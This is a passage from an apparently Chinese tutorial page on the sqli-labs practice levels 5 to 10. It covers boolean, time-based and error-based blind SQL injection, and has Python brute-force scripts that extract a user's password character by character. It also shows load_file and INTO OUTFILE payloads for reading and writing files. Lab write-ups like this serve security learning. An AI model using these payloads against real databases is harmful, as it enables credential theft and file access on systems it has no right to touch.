comment\\\"\u003e-- 456\u003c/span\u003e\\n\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eascii(ch)\u003c/code\u003e：返回字符\u003ccode class=\\\"x-inline-highlight\\\"\u003ech\u003c/code\u003e的ASCII码值，如果\u003ccode class=\\\"x-inline-highlight\\\"\u003ech\u003c/code\u003e是字符串，则返回第一个字符的ASCII码值。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT ascii(\\\"A\\\");   -- 65\\nSELECT ascii(\\\"abc\\\"); -- 97\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e ascii\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"A\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e   \u003cspan class=\\\"token comment\\\"\u003e-- 65\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e ascii\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"abc\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e \u003cspan class=\\\"token comment\\\"\u003e-- 97\u003c/span\u003e\\n\"}}]}]]}]]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"时间盲注\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在页面回显内容完全没有差异的情况下，就需要用时间盲注。时间盲注利用下面的MySQL函数：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003esleep(sec)\u003c/code\u003e：让数据库休眠指定的秒数。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT sleep(3);\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e sleep\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e3\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eif(cond, exp_true, exp_false)\u003c/code\u003e：如果条件\u003ccode class=\\\"x-inline-highlight\\\"\u003econd\u003c/code\u003e为真，则返回\u003ccode class=\\\"x-inline-highlight\\\"\u003eexp_true\u003c/code\u003e，否则返回\u003ccode class=\\\"x-inline-highlight\\\"\u003eexp_false\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT if(1+1=2,\\\"Yes\\\",\\\"No\\\"); -- Yes\\nSELECT if(11\u003e45,sleep(1),4); -- 4\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$18\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-golden\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"当发现服务端延迟时间远大于\u003ccode class=\\\"x-inline-highlight\\\"\u003esleep(...)\u003c/code\u003e设置的延迟参数时，可能是在当前语法中\u003ccode class=\\\"x-inline-highlight\\\"\u003esleep\u003c/code\u003e函数会对每一行数据都调用一次。例如：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT id FROM users WHERE sleep(1);\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e id \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e sleep\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"报错注入\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果服务端会将数据库报错信息返回给客户端，就可以利用报错信息进行注入，思路是让我们想要的查询结果作为报错信息的一部分返回。（此时盲注就不再是盲注了 ^v^）\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"报错注入常用的MySQL函数有：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eextractvalue(xml_string, xpath)\u003c/code\u003e：该函数用于从XML文档中提取数据。如果\u003ccode class=\\\"x-inline-highlight\\\"\u003expath\u003c/code\u003e不合法，报错中会出现\u003ccode class=\\\"x-inline-highlight\\\"\u003expath\u003c/code\u003e的内容。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"extractvalue(null,concat(0x7e,(SELECT 'anything'),0x7e))\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"extractvalue\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token boolean\\\"\u003enull\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003econcat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e0x7e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'anything'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e0x7e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"通常插入一个\u003ccode class=\\\"x-inline-highlight\\\"\u003e~\u003c/code\u003e（\u003ccode class=\\\"x-inline-highlight\\\"\u003e0x7e\u003c/code\u003e）分隔符，一方面方便定位报错信息，另一方面是使用Xpath不支持的字符确保稳定触发报错。\"}}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eupdatexml(xml_string, xpath, new_xml)\u003c/code\u003e\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"updatexml(null,concat(0x7e,(SELECT 'anything'),0x7e),null)\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"updatexml\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token boolean\\\"\u003enull\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003econcat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e0x7e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'anything'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e0x7e\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token boolean\\\"\u003enull\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\"}}]}]]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L5\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"以L5为例，思路是根据回显长度不同逐字符爆破出查询结果：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"from query import *\\n\\n# target: SELECT password FROM security.users WHERE username='Angelina'\\n\\nprint(len(query_get(\\\"Less-5\\\", \\\"?id=1' AND 1=0 -- \\\").text))  # 720\\nprint(len(query_get(\\\"Less-5\\\", \\\"?id=1' AND 1=1 -- \\\").text))  # 704\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f\\\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \\\"\\n        resp = query_get(\\\"Less-5\\\", payload)\\n        if len(resp.text) == 704:\\n            return i\\n    return None\\n\\n\\npassword = \\\"\\\"\\nwhile True:\\n    ch = brute_force(len(password) + 1)\\n    if ch is None:\\n        break\\n    print(\\\"[*] found\\\", chr(ch))\\n    password += chr(ch)\\n\\nprint(password)  # I-kill-you\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 168px, transparent 168px, transparent 264px, var(--bg-transparent-golden) 264px 360px, transparent 360px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$19\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L6\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"其他几个如法炮制，只需要变一下判断条件和闭合方式：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"print(len(query_get(\\\"Less-6\\\", '?id=1\\\" AND 1=0 -- ').text))  # 720\\nprint(len(query_get(\\\"Less-6\\\", '?id=1\\\" AND 1=1 -- ').text))  # 702\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f'?id=1\\\" AND ascii(substr((SELECT password FROM security.users WHERE username=\\\"Angelina\\\"),{pos},1))={i} -- '\\n        resp = query_get(\\\"Less-6\\\", payload)\\n        if len(resp.text) == 702:\\n            return i\\n    return None\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1a\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L7\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L7刚好两种响应的长度是一样的，所以通过内容判断：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003cfont color= \\\"#FFFF00\\\"\u003eYou have an error in your SQL syntax\u003c/font\u003e\u003c/font\u003e \u003c/div\u003e\u003c/br\u003e\u003c/br\u003e\u003c/br\u003e\u003ccenter\u003e\\n\u003cfont color= \\\"#FFFF00\\\"\u003eYou are in.... Use outfile......\u003cbr\u003e\u003c/font\u003e\u003c/font\u003e \u003c/div\u003e\u003c/br\u003e\u003c/br\u003e\u003c/br\u003e\u003ccenter\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1b\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"print(\\\"You are in\\\" in query_get(\\\"Less-7\\\", \\\"?id=1')) AND 1=0 -- \\\").text)  # False\\nprint(\\\"You are in\\\" in query_get(\\\"Less-7\\\", \\\"?id=1')) AND 1=1 -- \\\").text)  # True\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f\\\"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \\\"\\n        resp = query_get(\\\"Less-7\\\", payload)\\n        if \\\"You are in\\\" in resp.text:\\n            return i\\n    return None\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1c\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L8\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"print(len(query_get(\\\"Less-8\\\", \\\"?id=1' AND 1=0 -- \\\").text))  # 722\\nprint(len(query_get(\\\"Less-8\\\", \\\"?id=1' AND 1=1 -- \\\").text))  # 706\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f\\\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \\\"\\n        resp = query_get(\\\"Less-8\\\", payload)\\n        if len(resp.text) == 706:\\n            return i\\n    return None\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1d\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L9\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"print(len(query_get(\\\"Less-9\\\", \\\"?id=1' AND 1=0 -- \\\").text))  # 744\\nprint(len(query_get(\\\"Less-9\\\", \\\"?id=1' AND 1=1 -- \\\").text))  # 707\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f\\\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \\\"\\n        resp = query_get(\\\"Less-9\\\", payload)\\n        if len(resp.text) == 707:\\n            return i\\n    return None\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L10\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"print(len(query_get(\\\"Less-10\\\", '?id=1\\\" AND 1=0 -- ').text))  # 746\\nprint(len(query_get(\\\"Less-10\\\", '?id=1\\\" AND 1=1 -- ').text))  # 709\\n\\n\\ndef brute_force(pos):\\n    for i in range(32, 127):\\n        payload = f'?id=1\\\" AND ascii(substr((SELECT password FROM security.users WHERE username=\\\"Angelina\\\"),{pos},1))={i} -- '\\n        resp = query_get(\\\"Less-10\\\", payload)\\n        if len(resp.text) == 709:\\n            return i\\n    return None\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1f\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"补充：L5-L6报错注入\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L5和L6开启了报错回显，也可以使用报错注入，以L5为例：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=1' OR updatexml(null,concat(0x7e,(SELECT password FROM security.users WHERE username='Angelina'),0x7e),null) -- \\\"\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=1' OR updatexml(null,concat(0x7e,(SELECT password FROM security.users WHERE username='Angelina'),0x7e),null) -- \\\"\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"$L17\",null,{\"src\":\"L5.jpg\",\"width\":\"100%\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"补充：L7文件读写\"}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-golden\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"前置准备（攻击条件）\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"需要开启\u003ccode class=\\\"x-inline-highlight\\\"\u003esecure_file_priv\u003c/code\u003e，其默认值为\u003ccode class=\\\"x-inline-highlight\\\"\u003eNULL\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"mysql\u003e show variables like 'secure_file_priv';\\n+------------------+-------+\\n| Variable_name    | Value |\\n+------------------+-------+\\n| secure_file_priv | NULL  |\\n+------------------+-------+\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"mysql\u003e show variables like 'secure_file_priv';\\n+------------------+-------+\\n| Variable_name    | Value |\\n+------------------+-------+\\n| secure_file_priv | NULL  |\\n+------------------+-------+\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"我使用的环境是PHPStudy，修改\u003ccode class=\\\"x-inline-highlight\\\"\u003ePHPStudy\\\\Extensions\\\\MySQL5.7.26\\\\my.ini\u003c/code\u003e文件：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"[mysqld]\\n...\\nsecure_file_priv=\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"[mysqld]\\n...\\nsecure_file_priv=\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在\u003ccode class=\\\"x-inline-highlight\\\"\u003e[mysqld]\u003c/code\u003e下添加\u003ccode class=\\\"x-inline-highlight\\\"\u003esecure_file_priv=\u003c/code\u003e，然后重启MySQL服务。\"}}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"读文件（如果有回显）：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"... UNION SELECT 1,2,hex(load_file('/path/to/file')) --\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eUNION\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e2\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003ehex\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003eload_file\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'/path/to/file'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token comment\\\"\u003e--\u003c/span\u003e\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"写入文件（MySQL限制\u003ccode class=\\\"x-inline-highlight\\\"\u003eINTO OUTFILE\u003c/code\u003e不能覆盖已存在的文件）：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"... UNION SELECT 1,2,0x68656c6c6f INTO OUTFILE '/path/to/file' --\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eUNION\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e2\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e0x68656c6c6f\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eINTO\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eOUTFILE\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'/path/to/file'\u003c/span\u003e \u003cspan class=\\\"token comment\\\"\u003e--\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这会创建一个\u003ccode class=\\\"x-inline-highlight\\\"\u003e/path/to/file\u003c/code\u003e文件：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"1   2   